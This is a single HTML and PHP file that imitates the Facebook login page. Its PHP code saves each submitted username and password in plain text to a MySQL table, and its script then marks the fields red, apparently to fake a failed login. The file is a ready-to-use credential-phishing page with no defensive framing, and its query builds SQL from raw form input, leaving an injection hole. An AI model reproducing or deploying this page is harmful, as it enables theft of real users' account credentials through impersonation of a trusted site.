<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook.com</title>
    <style>
        .box{
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .logo {
  margin-bottom: 1rem;
  font-size: 1.2rem;
  text-align: center;
  color: #1877f2;
  font-weight: 700;
}

form {
  display: flex;
  flex-direction: column;
  background: #fff;
  padding: 1.5rem 1rem;
  width: 300px;
  border-radius: 0.5rem;
  box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
}

form input {
  outline: none;
  padding: 0.4rem 0.5rem;
  margin-bottom: 0.8rem;
  font-size: 0.9rem;
}

form input:focus {
  border: 1.8px solid #1877f2;
}

form .login {
  outline: none;
  border: none;
  background: #1877f2;
  padding: 0.8rem 1rem;
  border-radius: 0.4rem;
  font-size: 0.9rem;
  color: #fff;
}

form .login:hover {
  background: #0f71f1;
  cursor: pointer;
}

form a {
  text-decoration: none;
  text-align: center;
  font-size: 0.9rem;
  padding-top: 0.8rem;
  color: #1877f2;
}

form hr {
  background: #f7f7f7;
  margin: 0.5rem;
}

form .create-account {
  outline: none;
  border: none;
  background: #06b909;
  padding: 0.8rem 1rem;
  border-radius: 0.5rem;
  font-size: 0.9rem;
  color: #fff;
  width: 75%;
  margin: 0 auto;
}

form .create-account:hover {
  background: #03ad06;
  cursor: pointer;
}
    </style>
</head>
<body>
<div class="box">
<form  method="post">
  <p class="logo">Facebook</p>
  <input type="text" placeholder="Username" name="username" id="name" required="">
  <input type="password" placeholder="Password" name="password" id="pass" required="">
  <button class="login" type="submit">Log In</button>
  <a href="#">Forgot Password ?</a>
  <hr>
  <button class="create-account">Create New Account</button>
</form>
</div>

<script>
    document.querySelector('.login').addEventListener('click', function() {
              if( document.getElementById('name').value =="" || document.getElementById('pass').value ==""){
                alert("Please fill all the fields");
              }
              else{
                document.getElementById('name').style.border = "1px solid red";
                document.getElementById('pass').style.border = "1px solid red";
              }
              
    });

    
</script>
</body>
</html>


<!-- Php Code Started here -->



<?php 
$db = new mysqli("localhost" , "root" , "" , "fbb");
if($db->connect_error){
    echo "Connection Problem";
}
else{
    if($_SERVER["REQUEST_METHOD"] == "POST"){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $creatTable = "INSERT INTO user (username , password) VALUES ('$username' , '$password')";
        if ($db->query($creatTable)) {
            exit;
            // echo "Data created successfully";
        } else {
            // echo "Data not created";
        }
        exit;
    }
    else{
        // echo "Not a post";
    }
}


?> 